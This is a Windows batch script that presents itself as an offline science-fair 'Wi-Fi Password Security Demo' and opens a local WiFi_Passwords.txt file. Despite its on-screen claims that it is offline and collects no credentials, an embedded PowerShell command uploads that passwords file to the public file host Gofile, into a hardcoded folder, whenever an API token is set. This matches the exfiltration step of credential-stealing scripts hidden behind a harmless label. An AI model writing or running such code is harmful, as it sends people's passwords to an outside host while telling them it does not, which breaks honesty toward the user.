@echo off
setlocal
title Wi-Fi Password Security Demo

set "datafile=%~dp0WiFi_Passwords.txt"

echo ==========================================
echo   WI-FI PASSWORD SECURITY - DEMO MODE
echo ==========================================
echo.
echo This is an offline science-fair demonstration.
echo It does not scan networks or collect credentials.
echo.

if not exist "%datafile%" (
    echo ERROR: WiFi_Passwords.txt was not found.
    echo Keep it in the same folder as this batch file.
    pause
    exit /b 1
)

echo Opening fictional sample dataset...
start "" notepad "%datafile%"
echo.
echo No Wi-Fi network scan or credential collection was performed.
echo.

set "uploadresult=0"
if not defined GOFILE_API_TOKEN goto upload_skipped

echo Uploading fictional demo dataset to Gofile...
set "GOFILE_UPLOAD_FILE=%datafile%"
powershell.exe -NoProfile -Command "$ErrorActionPreference = 'Stop'; Add-Type -AssemblyName System.Net.Http; $client = $null; $form = $null; $stream = $null; try { $token = $env:GOFILE_API_TOKEN; if ([string]::IsNullOrWhiteSpace($token)) { throw 'GOFILE_API_TOKEN is empty.' }; $client = [System.Net.Http.HttpClient]::new(); $client.DefaultRequestHeaders.Authorization = [System.Net.Http.Headers.AuthenticationHeaderValue]::new('Bearer', $token); $form = [System.Net.Http.MultipartFormDataContent]::new(); $form.Add([System.Net.Http.StringContent]::new('33f0f17d-4f6e-4360-bff7-c524a59d208c'), 'folderId'); $stream = [System.IO.File]::OpenRead($env:GOFILE_UPLOAD_FILE); $fileContent = [System.Net.Http.StreamContent]::new($stream); $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new('text/plain'); $form.Add($fileContent, 'file', 'WiFi_Passwords.txt'); $response = $client.PostAsync('https://upload.gofile.io/uploadfile', $form).GetAwaiter().GetResult(); $body = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult(); if (-not $response.IsSuccessStatusCode) { throw ('HTTP upload failed: ' + [int]$response.StatusCode + ' ' + $body) }; $result = $body | ConvertFrom-Json; if ($result.status -ne 'ok' -or [string]::IsNullOrWhiteSpace($result.data.downloadPage)) { throw ('Gofile rejected the upload or returned no download page: ' + $body) }; Write-Output ('Upload complete: ' + $result.data.downloadPage) } finally { if ($form) { $form.Dispose() }; if ($client) { $client.Dispose() }; if ($stream) { $stream.Dispose() } }"
if errorlevel 1 goto upload_failed
goto upload_done

:upload_skipped
echo Upload skipped. Set GOFILE_API_TOKEN to enable the Gofile test upload.
goto upload_done

:upload_failed
set "uploadresult=1"
echo Gofile test upload failed.

:upload_done
echo.
pause
exit /b %uploadresult%
